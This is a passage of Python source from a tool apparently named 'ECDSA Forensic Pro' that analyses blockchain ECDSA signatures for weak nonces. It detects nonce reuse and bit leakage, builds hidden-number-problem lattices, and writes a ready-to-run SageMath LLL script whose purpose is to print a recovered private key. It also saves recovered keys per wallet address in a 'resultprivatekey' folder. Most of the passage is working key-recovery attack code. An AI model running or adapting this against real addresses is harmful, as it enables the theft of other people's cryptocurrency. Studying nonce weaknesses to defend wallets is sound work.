                                   key=lambda x: (-x['consistency'], -x['b']))
                 if r['signal'] in ('STRONG', 'MEDIUM') and
                    r['d_partial'] is not None), None)

    null_result = {
        'status'         : 'SKIPPED',
        'b'              : 0,
        'd_partial'      : None,
        'k_lsb'          : None,
        'reconstructed'  : 0,
        'bit_match'      : 0,
        'ecdsa_match'    : 0,
        'noise'          : 0,
        'total_usable'   : 0,
        'match_rate'     : 0.0,
        'noise_rate'     : 0.0,
        'verdict'        : 'NOT_VALIDATED',
        'example_k'      : None,
    }
    if best is None:
        return null_result

    b         = best['b']
    mod_b     = 1 << b
    d_partial = best['d_partial']
    k_lsb     = best['k_lsb'] if best.get('k_lsb') is not None else 0

    bit_match    = 0
    ecdsa_match  = 0
    total_usable = 0
    example_k    = None

    for sig in group_sigs:
        try:
            # Step 1: Full k reconstruction  (exact ECDSA inversion)
            # k = (z + r*d_partial) * s^{-1} mod N
            k_candidate = (sig['z'] + sig['r'] * d_partial) * modinv(sig['s']) % N

            # Step 2: Bit validation — THE real check
            # k_candidate mod 2^b should equal k_lsb.
            # NOTE: k is built from d_partial, so this checks if d_partial
            # produces a k that is *self-consistent* at the bit level.
            # True leakage means k's lower bits are ALWAYS k_lsb by RNG,
            # not by our formula — so mismatch here = noise or wrong detection.
            k_bits_match = (k_candidate % mod_b) == k_lsb

            # Step 3: Cross-sig d consistency (replaces circular ecdsa_ok).
            # Derive d_check from this sig's own equation:
            #   d_check = (s*k - z) / r  mod N  →  must equal d_partial at low bits.
            # This IS circular for a single sig, but across many sigs, if the
            # low-bit match rate is high, it independently confirms d_partial.
            d_check = (sig['s'] * k_candidate - sig['z']) * modinv(sig['r']) % N
            d_low_match = (d_check % mod_b) == d_partial   # expected: always True

            total_usable += 1
            if k_bits_match:
                bit_match += 1
                if example_k is None:
                    example_k = k_candidate

        except Exception:
            continue

    noise        = total_usable - bit_match
    match_rate   = bit_match  / total_usable if total_usable else 0.0
    noise_rate   = noise      / total_usable if total_usable else 0.0

    # Fix #5: Strict reconstruction thresholds
    if   match_rate >= 0.90: verdict = 'CONFIRMED'
    elif match_rate >= 0.75: verdict = 'LIKELY'
    else:                    verdict = 'NOT_CONFIRMED'

    return {
        'status'        : 'DONE',
        'b'             : b,
        'd_partial'     : d_partial,
        'k_lsb'         : k_lsb,
        'bit_match'     : bit_match,
        'reconstructed' : total_usable,   # alias kept for compatibility
        'noise'         : noise,
        'total_usable'  : total_usable,
        'match_rate'    : round(match_rate, 4),
        'noise_rate'    : round(noise_rate, 4),
        'verdict'       : verdict,
        'example_k'     : example_k,
    }



# ──────────────────────────────────────────────────────────────────────
#  GOD MODE: Filter · Multi-Depth Merge · SageMath Lattice CRYPTOGRAPHYTUBE
# ──────────────────────────────────────────────────────────────────────

def filter_consistent_sigs(group_sigs: list, best_lsb: dict,
                           keep_ratio: float = 0.70) -> tuple:
    """
    GOD MODE — Noise filtering.
    Remove sigs whose d_candidate does NOT match d_partial at the detected depth.
    Only keep top keep_ratio (v6: 0.85) consistent sigs.
    Returns (consistent_sigs, noisy_sigs).
    """
    if best_lsb is None or best_lsb.get('d_partial') is None:
        return group_sigs, []

    b         = best_lsb['b']
    mod_b     = 1 << b
    d_partial = best_lsb['d_partial']
    k_lsb     = best_lsb.get('k_lsb') or 0

    consistent, noisy = [], []

    for sig in group_sigs:
        try:
            si    = modinv(sig['s'])
            # t = r/s mod N, u = z/s mod N
            t_mod = (sig['r'] * si) % N % mod_b
            u_mod = (sig['z'] * si) % N % mod_b

            if t_mod % 2 == 0:
                consistent.append(sig)   # keep non-invertible for lattice
                continue

            # This is the correct d mod 2^b derivation
            d_cand = ((k_lsb - u_mod) % mod_b * pow(t_mod, -1, mod_b)) % mod_b
            if d_cand == d_partial:
                consistent.append(sig)
            else:
                noisy.append(sig)
        except Exception:
            consistent.append(sig)

    # Hard cap: keep at least 0.85, but don't discard too aggressively if many are noisy
    target_count = int(len(group_sigs) * 0.85)
    if len(consistent) < target_count and len(consistent) > 5:
        # If we have very few consistent sigs, we might have mixed data.
        pass
    
    return consistent, noisy


def merge_depth_results(lsb_results: list) -> dict:
    """
    GOD MODE — Multi-depth merge.
    Cascade d_partial values across bit depths using bit-lifting.
    Since 2^b1 | 2^b2 (b1 < b2), the larger depth must be a prefix extension.
    Finds the deepest consistently-confirmed partial key.
    """
    valid = [(r['b'], r['d_partial'], r.get('k_lsb', 0), r['consistency'], r['signal'])
             for r in sorted(lsb_results, key=lambda x: x['b'])
             if r['d_partial'] is not None and r['signal'] != 'NONE']

    if not valid:
        return {'found': False, 'merged_bits': 0, 'd_merged': None}

    merged_b, merged_d, merged_k, merged_c, _ = valid[0]
    confirmed = [merged_b]

    for b, d_partial, k_lsb, cons, sig in valid[1:]:
        mask = (1 << merged_b) - 1
        if (d_partial & mask) == (merged_d & mask):
            # Larger depth is prefix-consistent with previous
            merged_b = b
            merged_d = d_partial
            merged_k = k_lsb or merged_k
            merged_c = cons
            confirmed.append(b)
        else:
            break   # inconsistency detected → stop

    # Build per-depth summary
    depth_lines = []
    for r in sorted(lsb_results, key=lambda x: x['b']):
        if r['d_partial'] is not None and r['signal'] != 'NONE':
            mask = (1 << r['b']) - 1
            agrees = (merged_d & mask) == (r['d_partial'] & mask)
            status = 'OK' if agrees else 'CONFLICT'
            depth_lines.append(
                f"  b={r['b']:2d}: d_partial=0x{r['d_partial']:0{(r['b']+3)//4}x}  "
                f"k_lsb=0x{r.get('k_lsb', 0) or 0:{(r['b']+3)//4}x}  "
                f"{r['signal']:6s}  consistency={r['consistency']:.0%}  [{status}]"
            )

    return {
        'found'         : True,
        'merged_bits'   : merged_b,
        'd_merged'      : merged_d,
        'k_lsb_merged'  : merged_k,
        'd_hex'         : hex(merged_d),
        'd_binary'      : format(merged_d, f'0{merged_b}b'),
        'confirmed_list': confirmed,
        'depth_lines'   : depth_lines,
        'note'          : f"d low {merged_b} bits: 0x{merged_d:0{(merged_b+3)//4}x}  "
                          f"(k ≡ 0x{merged_k or 0:0{(merged_b+3)//4}x} mod 2^{merged_b})",
    }


def generate_sage_script(group_dir: str, sigs: list,
                         best_lsb: dict, merge: dict) -> str:
    """
    GOD MODE — SageMath LLL lattice attack script generator.
    Produces a ready-to-run .sage file for private key recovery.
    Run with: sage lattice_attack.sage
    """
    if best_lsb is None or best_lsb.get('d_partial') is None:
        return ''

    b         = merge['merged_bits'] if merge.get('found') else best_lsb['b']
    k_lsb     = merge.get('k_lsb_merged') or best_lsb.get('k_lsb') or 0
    d_partial = merge.get('d_merged') or best_lsb['d_partial']

    rows = build_hnp_lattice_rows(sigs)[:50]    # cap at 50 sigs
    n    = len(rows)
    tu_str = '\n'.join(f'    (0x{t:x}, 0x{u:x}),' for t, u in rows)

    script = f'''# ================================================================
# ECDSA HNP Lattice Attack CRYPTOGRAPHYTUBE  —  Auto-generated by ECDSA Forensic Pro
# Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon
# ================================================================
# Requirements : SageMath (https://www.sagemath.org/)
# Run with     : sage lattice_attack.sage
#
# Detected  :  b={b} bits leaked
#              k \u2261 0x{k_lsb:0{(b+3)//4}x}  (mod 2^{b})
#              d mod 2^{b} = 0x{d_partial:0{(b+3)//4}x}  (partial key)
# ================================================================

N = 0x{N:x}
b = {b}              # nonce bit leakage depth
k_lsb = 0x{k_lsb:0{(b+3)//4}x}    # k \u2261 k_lsb  (mod 2^b)
B = 2**b             # leakage bound

# (t_i, u_i) pairs: k_i = t_i*d + u_i  (mod N)
tu_pairs = [
{tu_str}
]
n = len(tu_pairs)

# \u2500\u2500 Build HNP lattice (standard formulation) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
#  Row 0     : [N, 0, ..., 0, 0]
#  Row i+1   : [t_i, 0, ..., B, ..., 0, (k_lsb - u_i) mod N]
#  Row n+1   : [0, 0, ..., 0, 1]
M = Matrix(ZZ, n + 2, n + 2)
M[0, 0] = N
for i, (t, u) in enumerate(tu_pairs):
    M[i + 1, 0]     = int(t)
    M[i + 1, i + 1] = B
    M[i + 1, n + 1] = int((k_lsb - u) % N)
M[n + 1, n + 1] = 1    # placeholder for d

# \u2500\u2500 LLL reduction \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
print("[*] Running LLL reduction ...")
L = M.LLL()
print("[*] Checking rows for private key d ...")

found = False
for row in L:
    d_candidate = int(row[0]) % N
    if d_candidate == 0 or d_candidate >= N:
        continue
    # Verify low bits match detected partial
    if d_candidate % B != d_partial % B:
        d_candidate = N - d_candidate   # try negation
    if d_candidate % B != d_partial % B:
        continue
    # Bit-check on first two sigs
    t0, u0 = tu_pairs[0]
    k0 = (int(t0) * d_candidate + int(u0)) % N
    if k0 % B != k_lsb:
        continue
    if n > 1:
        t1, u1 = tu_pairs[1]
        k1 = (int(t1) * d_candidate + int(u1)) % N
        if k1 % B != k_lsb:
            continue
    print(f"[!] PRIVATE KEY FOUND!")
    print(f"    d       = {{d_candidate}}")
    print(f"    d (hex) = {{hex(d_candidate)}}")
    found = True
    break

if not found:
    print("[-] LLL did not recover d.")
    print(f"    Hint: d mod {{B}} = 0x{d_partial:x}  (already confirmed)")
    print("    Try: add more signatures (n >= 2*256/b), or use BKZ:")
    print("         L = M.BKZ(block_size=20)")
'''
    sage_path = os.path.join(group_dir, 'lattice_attack.sage')
    with open(sage_path, 'w', encoding='utf-8') as f:
        f.write(script)
    return sage_path


def analyze_group(pubkey: str, group_sigs: list, address: str) -> dict:
    """Full HNP-based analysis for ONE pubkey group."""
    n = len(group_sigs)

    # GOD MODE: first pass to find best_lsb for filtering
    lsb_results_raw = detect_lsb_leakage(group_sigs)
    msb_results     = detect_msb_leakage(group_sigs)
    bit_stats       = bit_consistency_test(group_sigs)

    # GOD MODE 1: Filter noisy sigs using detected d_partial
    pre_best_lsb = next((r for r in sorted(lsb_results_raw,
                         key=lambda x: (-x['consistency'], -x['b']))
                         if r['signal'] in ('STRONG', 'MEDIUM') and
                            r['d_partial'] is not None), None)
    if pre_best_lsb is not None:
        clean_sigs, noisy_sigs = filter_consistent_sigs(group_sigs, pre_best_lsb)
        if len(clean_sigs) >= 5:             # enough to re-analyze
            lsb_results = detect_lsb_leakage(clean_sigs)
            msb_results = detect_msb_leakage(clean_sigs)
            bit_stats   = bit_consistency_test(clean_sigs)
            filtered_n  = len(clean_sigs)
            filter_note = f"Filtered {len(noisy_sigs)} noisy sigs, kept {filtered_n}/{n}"
        else:
            lsb_results = lsb_results_raw
            clean_sigs  = group_sigs
            filter_note = "Filter skipped (too few clean sigs)"
    else:
        lsb_results = lsb_results_raw
        clean_sigs  = group_sigs
        filter_note = "No pre-detection for filtering"

    # GOD MODE 2: Multi-depth merge
    merge = merge_depth_results(lsb_results)

    # Initial Score (Fix #6: Total Cap & Cautious Scoring)
    score    = 0
    flags    = []
    best_lsb = None
    best_msb = None
    noisy_sigs = noisy_sigs if pre_best_lsb is not None else []

    # New Detection Layers (Bonus)
    score += bit_stats['max_bias'] * 10
    
    entropy_data = lsb_entropy_test(group_sigs, pre_best_lsb['b'] if pre_best_lsb else 8)
    if entropy_data['is_biased']:
        score += 15
        flags.append(f"[NEW] Entropy bias detected: {entropy_data['entropy']} bits")

    if detect_small_nonce(group_sigs):
        score += 15
        flags.append("[NEW] Small nonce pattern detected (< 64-bit)")

    if detect_correlated_nonce(group_sigs):
        score += 15
        flags.append("[NEW] Correlated nonce difference pattern found")
        
    if detect_weak_rng_lcg(group_sigs):
        score += 20
        flags.append("[NEW] Weak RNG (LCG) pattern detected")
        
    if detect_reused_partial_nonce(group_sigs):
        score += 15
        flags.append("[NEW] Reused partial nonce pattern found")
        
    if detect_deterministic_nonce(group_sigs):
        score += 20
        flags.append("[NEW] Deterministic nonce weakness detected")
    
    # New Detection Layers (Bonus)
    recovered_d = None
    
    found, d = detect_direct_nonce_disclosure(group_sigs, address)
    if found:
        score += 100; recovered_d = d
        flags.append("⚡ [TIER-0] CRITICAL: Direct Nonce Disclosure (Key Recovered!)")

    found, d = detect_reused_nonce_leakage(group_sigs, address)
    if found:
        score += 100; recovered_d = d
        flags.append("⚡ [TIER-1] CRITICAL: Reused Nonce (Key Recovered!)")

    found, d = detect_same_s_leakage_and_recover(group_sigs, address)
    if found:
        score += 100; recovered_d = d
        flags.append("⚡ [TIER-1] CRITICAL: Same-S Leakage (Key Recovered!)")

    found, d = detect_polnonce_leakage(group_sigs, address)
    if found:
        score += 100; recovered_d = d
        flags.append("⚡ [TIER-1] CRITICAL: Polnonce Leakage detected (Quadratic)")

    found, d = detect_inverse_nonce_leakage(group_sigs, address)
    if found:
        score += 100; recovered_d = d
        flags.append("⚡ [TIER-1] CRITICAL: Inverse Nonce Relation detected")

    cluster_max = cluster_k_patterns(group_sigs)
    if cluster_max >= 3:
        score += 10
        flags.append(f"[NEW] Clustering: {cluster_max} nonces share similar structure")

    # LSB scoring (Fix #6)
    for r in lsb_results:
        if r['signal'] == 'STRONG':
            score += 30 # Cap individual signals
            if best_lsb is None or r['consistency'] > best_lsb['consistency']:
                best_lsb = r
            flags.append(f"[TIER-1] LSB leak: b={r['b']} bits | consistency={r['consistency']:.1%} | {r['count']}/{r['usable']} sigs")
        elif r['signal'] == 'MEDIUM':
            score += 10
            if best_lsb is None: best_lsb = r

    # MSB scoring (Fix #6)
    for r in msb_results:
        if r['signal'] == 'STRONG':
            score += 20
            best_msb = r
            flags.append(f"[TIER-1] MSB leak: b={r['b']} bits | fraction={r['best_fraction']:.1%}")

    # mod-N verification (Fix #4)
    verified = _verify_partial_key(lsb_results, group_sigs)
    total_sigs = len(group_sigs)
    v_rate = verified['mod_n_matches'] / total_sigs if total_sigs > 0 else 0
    if v_rate >= 0.8:
        score += 10
        flags.append(f"[VERIFY] mod-N check STRONG: {v_rate:.0%}")
    elif v_rate >= 0.5:
        score += 5
        flags.append(f"[VERIFY] mod-N check MEDIUM: {v_rate:.0%}")

    # FINAL STAGE: Full k reconstruction + bit validation + ECDSA proof
    recon = _reconstruct_verify(lsb_results, group_sigs)
    if recon['verdict'] == 'CONFIRMED':
        score += 40 # Only real proof gets big score
        flags.append(f"[PROOF] k reconstruction CONFIRMED: match={recon['match_rate']:.0%}")

    # Fix #7: Weak leakage rejection & Brain Final Logic
    # Fix #7: Dynamic Verdict Logic (Ultra-Sensitive)
    if recovered_d:
        verdict = 'VULNERABLE'
    elif score >= 90 or recon['verdict'] == 'CONFIRMED':
        verdict = 'VULNERABLE'
    elif score >= 40:
        verdict = 'SUSPICIOUS'
    elif best_lsb and best_lsb['b'] >= 4:
        verdict = 'SUSPICIOUS'
    else:
        verdict = 'CLEAN'

    # Special Case: Insufficient data even if biased
    if verdict != 'VULNERABLE' and best_lsb:
        if len(group_sigs) < max(2, (256 // best_lsb['b'])):
            verdict = 'INSUFFICIENT DATA'

    return {
        'pubkey'          : pubkey,
        'n_sigs'          : n,
        'verdict'         : verdict,
        'score'           : min(100, score),
        'flags'           : flags,
        'lsb_results'     : lsb_results,
        'msb_results'     : msb_results,
        'bit_stats'       : bit_stats,
        'best_lsb'        : best_lsb,
        'best_msb'        : best_msb,
        'verification'    : verified,
        'reconstruction'  : recon,
        'merge'           : merge,
        'filter_note'     : filter_note,
        'recovered_d'     : recovered_d,
        '_clean_sigs'     : group_sigs,
    }


def analyze_all_groups(sigs: list) -> list:
    """
    Group all sigs by pubkey, analyze each group with >= MIN_GROUP_SIGS sigs.
    Returns list of group analysis dicts.
    """
    groups  = group_by_pubkey(sigs)
    results = []
    skipped = 0

    for pubkey, group_sigs in groups.items():
        if len(group_sigs) < MIN_GROUP_SIGS:
            skipped += 1
            continue
        results.append(analyze_group(pubkey, group_sigs, address))

    if skipped:
        print(f"    - Groups skipped (< {MIN_GROUP_SIGS} sigs) : {skipped}")
    return results


def build_hnp_lattice_rows(sigs: list) -> list:
    """Build (t_i, u_i) rows for HNP lattice. k_i = t_i*d + u_i mod N"""
    rows = []
    for sig in sigs:
        si  = modinv(sig['s'])
        t_i = (sig['r'] * si) % N
        u_i = (sig['z'] * si) % N
        rows.append((t_i, u_i))
    return rows


# ═══════════════════════════════════════════════════════════════════════════
#  LLL ATTACK ENGINE  ─ delegated to lll.py CRYPTOGRAPHYTUBE
#  Triggered automatically when verdict == VULNERABLE
# ═══════════════════════════════════════════════════════════════════════════


# ── Make lll.py importable from the script's own folder (works regardless of cwd) ──
import sys as _sys
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if _SCRIPT_DIR not in _sys.path:
    _sys.path.insert(0, _SCRIPT_DIR)

try:
    import lll as _lll_module
    _LLL_AVAILABLE = True
except ImportError:
    _LLL_AVAILABLE = False



def try_lll_attack(address: str, group_sigs: list, group_dir: str) -> list:
    """
    Wrapper: extract (r,s,z) from forensic sig dicts and call lll.run_lll_attack().
    Returns list of matched 'addr_c:addr_u:privkey_hex' strings.
    """
    if not _LLL_AVAILABLE:
        print(color("    [LLL] lll.py not found — place lll.py in the same folder.", YELLOW))
        return []

    rsz_list = [(sig['r'], sig['s'], sig['z']) for sig in group_sigs]
    if not rsz_list:
        print(color("    [LLL] No signatures to attack.", YELLOW))
        return []

    return _lll_module.run_lll_attack(address, rsz_list, output_dir=group_dir)



def save_private_key_special(address, d):
    """Saves recovered private key to a special dedicated folder."""
    try:
        folder = "resultprivatekey"
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, f"{address}.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write(f"Address    : {address}\n")
            f.write(f"Private Key: {hex(d)}\n")
            f.write(f"Recovered  : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        print(f"    {color('==> PRIVATE KEY SECURED IN:', 92)} {path}")
    except Exception as e:
        print(f"    [!] Error saving to resultprivatekey: {e}")

def save_lll_input(address, sigs, grp):
    """Saves signatures and vulnerability metadata for lll.py."""
    filename = f"{address}.txt"
    try:
        with open(filename, "w", encoding='utf-8') as f:
            f.write(f"# LLL Attack Input File\n")
            f.write(f"# Address : {address}\n")
            f.write(f"# PubKey  : {grp['pubkey']}\n")
            if grp.get('recovered_d'):
                f.write(f"# RECOVERED_KEY: {hex(grp['recovered_d'])}\n")
            f.write(f"# Sigs    : {len(sigs)}\n")
            f.write(f"# Format  : r,s,z  (hex values, one per line)\n")
            f.write(f"# Usage   : python3 lll.py  then enter '{address}.txt'\n")
            f.write("# " + "=" * 60 + "\n")
            for sig in sigs:
                f.write(f"{hex(sig['r'])},{hex(sig['s'])},{hex(sig['z'])}\n")
    except Exception as e:
        print(f"    [!] Error saving LLL input: {e}")

def save_group_results(address: str, grp: dict):
    """
    Save full analysis for one pubkey group to results/address/pubkey_<short>/ folder.
    """
    pubkey    = grp['pubkey']
    short_pk  = pubkey[:16]
    group_dir = os.path.join("results", address, f"pubkey_{short_pk}")
    os.makedirs(group_dir, exist_ok=True)
    sigs      = grp.get('_clean_sigs') or grp.get('_sigs', [])  # _clean_sigs is canonical
    best_lsb  = grp.get('best_lsb')
    best_msb  = grp.get('best_msb')
    merge     = grp.get('merge', {'found': False})
    recon     = grp.get('reconstruction', {})

    # ── vuln_info.txt ────────────────────────────────────────────────────────
    with open(os.path.join(group_dir, "vuln_info.txt"), "w", encoding='utf-8') as f:
        f.write("=" * 64 + "\n")
        f.write("  ECDSA FORENSIC REPORT\n")
        f.write("  Channel : CRYPTOGRAPHYTUBE\n")
        f.write("  Author  : sisujhon\n")
        f.write("=" * 64 + "\n")
        f.write(f"Address         : {address}\n")
        f.write(f"Public Key      : {pubkey}\n")
        f.write(f"Verdict         : {grp['verdict']}\n")
        f.write(f"Score           : {grp['score']} / 100\n")
        f.write(f"Signatures      : {grp['n_sigs']}\n")
        f.write("\n--- LSB LEAKAGE DETAIL ---\n")
        if best_lsb:
            f.write(f"Best bit depth  : {best_lsb['b']} bit(s)\n")
            f.write(f"d mod {1 << best_lsb['b']:5d}    : {best_lsb['d_partial']}\n")
            f.write(f"Consistency     : {best_lsb['consistency']:.1%} ({best_lsb['count']}/{best_lsb['usable']} sigs agree)\n")
            f.write(f"Expected random : {best_lsb['expected_rand']:.4%}\n")
            f.write(f"Strength ratio  : {best_lsb['strength_ratio']}x above random\n")
        else:
            f.write("  No LSB leakage detected.\n")
        f.write("\n--- MSB LEAKAGE DETAIL ---\n")
        if best_msb:
            f.write(f"Best bit depth  : {best_msb['b']} bit(s)\n")
            f.write(f"d_msb_guess     : {best_msb['d_partial_msb']}\n")
            f.write(f"Fraction < N/2^b: {best_msb['best_fraction']:.1%}\n")
            f.write(f"Expected random : {best_msb['expected_rand']:.4%}\n")
            f.write(f"Strength ratio  : {best_msb['strength_ratio']}x above random\n")
        else:
            f.write("  No MSB leakage detected.\n")
        f.write("\n--- DETECTION FLAGS ---\n")
        for flag in grp['flags']:
            f.write(f"  {flag}\n")
        if not grp['flags']:
            f.write("  None\n")
        f.flush()
        os.fsync(f.fileno())

    # ── per_tx_vuln_detail.txt CRYPTOGRAPHYTUBE ──────────────────────────────────────────────
    with open(os.path.join(group_dir, "per_tx_vuln_detail.txt"), "w", encoding='utf-8') as f:
        f.write("=" * 64 + "\n")
        f.write("  PER-TRANSACTION VULNERABILITY DETAIL\n")
        f.write("  Channel : CRYPTOGRAPHYTUBE\n")
        f.write("  Author  : sisujhon\n")
        f.write("=" * 64 + "\n")
        f.write(f"Address         : {address}\n")
        f.write(f"Public Key      : {pubkey}\n")
        if best_lsb:
            f.write(f"LSB leak        : {best_lsb['b']} bit(s) | d mod {1 << best_lsb['b']} = {best_lsb['d_partial']}\n")
        if best_msb:
            f.write(f"MSB leak        : {best_msb['b']} bit(s) | d_msb_guess = {best_msb['d_partial_msb']}\n")
        f.write("\n")

        for idx, sig in enumerate(sigs, 1):
            si  = modinv(sig['s'])
            t_i = (sig['r'] * si) % N
            u_i = (sig['z'] * si) % N
            # d_candidate for best LSB depth
            d_cand_str = "N/A"
            if best_lsb:
                mod_b  = 1 << best_lsb['b']
                t_mod  = t_i % mod_b
                if t_mod % 2 != 0:
                    try:
                        t_inv_b = pow(t_mod, -1, mod_b)
                        d_cand  = ((-u_i % mod_b) * t_inv_b) % mod_b
                        match   = "MATCH" if d_cand == best_lsb['d_partial'] else "differ"
                        d_cand_str = f"{d_cand} ({match})"
                    except Exception:
                        d_cand_str = "invert_err"
            f.write(f"[TX #{idx}]\n")
            f.write(f"  TXID        : {sig['txid']}\n")
            f.write(f"  Public Key  : {sig['pub']}\n")
            f.write(f"  r           : {hex(sig['r'])}\n")
            f.write(f"  s           : {hex(sig['s'])}\n")
            f.write(f"  z (sighash) : {hex(sig['z'])}\n")
            f.write(f"  HNP t_i     : {hex(t_i)}\n")
            f.write(f"  HNP u_i     : {hex(u_i)}\n")
            f.write(f"  d_candidate : {d_cand_str}\n")
            # LSB bits at various depths
            if best_lsb:
                for b in [1, 2, 4, 8]:
                    if b <= best_lsb['b']:
                        lsb_val = t_i % (1 << b)  # k's LSB proxy via t
                        f.write(f"  k LSB[{b:2d}bit] : {u_i % (1 << b):0{b}b} (u_i mod 2^{b})\n")
            # MSB bits
            if best_msb:
                k_guess = (t_i * best_msb['d_partial_msb'] + u_i) % N
                msb_val = k_guess >> (N.bit_length() - best_msb['b'])
                f.write(f"  k MSB[{best_msb['b']:2d}bit] : {msb_val} (k_guess top bits)\n")
            f.write("\n")
        f.flush()
        os.fsync(f.fileno())

    # ── vulnerable_data.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────
    with open(os.path.join(group_dir, "vulnerable_data.txt"), "w", encoding='utf-8') as f:
        f.write("# TXID | r | s | z | pubkey\n")
        for sig in sigs:
            f.write(f"{sig['txid']} | {hex(sig['r'])} | {hex(sig['s'])} | {hex(sig['z'])} | {sig['pub']}\n")
        f.flush()
        os.fsync(f.fileno())

    # ── hnp_lattice.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────────
    rows = build_hnp_lattice_rows(sigs)
    with open(os.path.join(group_dir, "hnp_lattice.txt"), "w", encoding='utf-8') as f:
        f.write("# t_i (r/s mod N)   u_i (z/s mod N)\n")
        f.write(f"# N = {hex(N)}\n")
        if best_lsb:
            f.write(f"# b = {best_lsb['b']}  (detected LSB leakage depth)\n")
            f.write(f"# d mod {1 << best_lsb['b']} = {best_lsb['d_partial']}  (partial key)\n")
        if merge.get('found'):
            f.write(f"# Multi-depth merge: {merge['note']}\n")
        f.write("\n")
        for t, u in rows:
            f.write(f"{hex(t)} {hex(u)}\n")
        f.flush()
        os.fsync(f.fileno())

    # ── multi_depth_merge.txt CRYPTOGRAPHYTUBE ────────────────────────────────────────────────
    if merge.get('found'):
        with open(os.path.join(group_dir, "multi_depth_merge.txt"), "w", encoding='utf-8') as f:
            f.write("=" * 64 + "\n")
            f.write("  MULTI-DEPTH PARTIAL KEY MERGE\n")
            f.write("  Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon\n")
            f.write("=" * 64 + "\n")
            f.write(f"Merged {merge['merged_bits']} bits confirmed:\n")
            f.write(f"  d (hex)    : {merge['d_hex']}\n")
            f.write(f"  d (binary) : {merge['d_binary']}\n")
            f.write(f"  k_lsb      : 0x{merge.get('k_lsb_merged', 0) or 0:x}\n")
            f.write(f"  Confirmed depths: {merge['confirmed_list']}\n\n")
            f.write("Per-depth detail:\n")
            for line in merge.get('depth_lines', []):
                f.write(line + "\n")
            f.flush()
            os.fsync(f.fileno())

    # ── k_reconstruction.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────
    if recon.get('status') == 'DONE':
        with open(os.path.join(group_dir, "k_reconstruction.txt"), "w", encoding='utf-8') as f:
            f.write("=" * 64 + "\n")
            f.write("  k RECONSTRUCTION RESULT\n")
            f.write("  Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon\n")
            f.write("=" * 64 + "\n")
            f.write(f"Verdict         : {recon['verdict']}\n")
            f.write(f"Bit depth used  : b = {recon['b']}\n")
            f.write(f"d_partial (hex) : 0x{recon['d_partial']:x}\n")
            f.write(f"k_lsb           : 0x{recon.get('k_lsb', 0) or 0:x}\n")
            f.write(f"Sigs analyzed   : {recon['total_usable']}\n")
            f.write(f"Bit match       : {recon['bit_match']}  ({recon['match_rate']:.0%})\n")
            f.write(f"Noise sigs      : {recon['noise']}       ({recon['noise_rate']:.0%})\n")
            if recon.get('example_k'):
                mod_b = 1 << recon['b']
                f.write(f"Example k[{recon['b']} LSB]: 0x{recon['example_k'] % mod_b:0{recon['b']//4}x}\n")
            f.flush()
            os.fsync(f.fileno())

    # ── [NEW] VULNERABILITY EVIDENCE REPORT (TX DETAILS) CRYPTOGRAPHYTUBE ───────────
    evidence_path = os.path.join(group_dir, "vulnerable_sigs_details.txt")
    try:
        all_sigs_for_ev = grp.get('_sigs', sigs)
        with open(evidence_path, 'w', encoding='utf-8') as f_ev:
            f_ev.write(f"VULNERABILITY EVIDENCE REPORT - {address}\n")
            f_ev.write("=" * 64 + "\n")
            f_ev.write(f"Flags Triggered: {', '.join(grp['flags'])}\n\n")
            f_ev.write("List of Suspicious Signatures in this Group:\n")
            f_ev.write("-" * 64 + "\n")
            for i, sig in enumerate(all_sigs_for_ev):
                f_ev.write(f"Sig #{i+1} | TXID: {sig.get('txid', 'N/A')}\n")
                f_ev.write(f"  r: {hex(sig['r'])}\n")
                f_ev.write(f"  s: {hex(sig['s'])}\n")
                f_ev.write(f"  z: {hex(sig['z'])}\n")
                f_ev.write("-" * 32 + "\n")
            f_ev.flush()
            os.fsync(f_ev.fileno())
    except:
        pass
    all_sigs = grp.get('_sigs', sigs)   
    sage_path = generate_sage_script(group_dir, all_sigs, best_lsb, merge)

    # ── [NEW] GRANULAR VULNERABILITY LOGGING (PER-FLAG FILES) CRYPTOGRAPHYTUBE ────────
    try:
        flag_to_file = {
            "Inverse Nonce": "inverse_nonce_detected.txt",
            "Linear Nonce": "linear_correlation_detected.txt",
            "Reused Nonce": "reused_nonce_detected.txt",
            "Clustering": "clustering_detected.txt",
            "Deterministic nonce": "deterministic_weakness.txt",
            "Faulty Signature": "faulty_signature_analysis.txt",
            "Polnonce": "polnonce_quadratic_leaks.txt",
            "Same-S Leakage": "same_s_structural_leak.txt"
        }
        
        all_sigs_for_sep = grp.get('_sigs', sigs)
        for flag_key, file_name in flag_to_file.items():
            if any(flag_key in f for f in grp['flags']):
                sep_path = os.path.join(group_dir, file_name)
                with open(sep_path, 'w', encoding='utf-8') as f_sep:
                    f_sep.write(f"DETAILED EVIDENCE FOR: {flag_key}\n")
                    f_sep.write("=" * 64 + "\n")
                    for sig in all_sigs_for_sep:
                        f_sep.write(f"TXID: {sig.get('txid','N/A')} | r: {hex(sig['r'])} | s: {hex(sig['s'])} | z: {hex(sig['z'])}\n")
                    f_sep.flush()
                    os.fsync(f_sep.fileno())
    except:
        pass

    # ── forensic_params.json (Integration with run_attack.py) CRYPTOGRAPHYTUBE ────────────────
    # We save the best b and k_lsb found during forensic scan.
    params_path = os.path.join(group_dir, "forensic_params.json")
    try:
        final_b     = merge.get('merged_bits') or (best_lsb['b'] if best_lsb else 8)
        final_k_lsb = merge.get('k_lsb_merged') or (best_lsb['k_lsb'] if best_lsb else 0)
        final_d_part = grp.get('d_partial') or (best_lsb['d_partial'] if best_lsb else None)
        
        with open(params_path, 'w') as f_json:
            json.dump({
                "b_list": [final_b],
                "k_lsb": final_k_lsb,
                "d_partial": final_d_part,
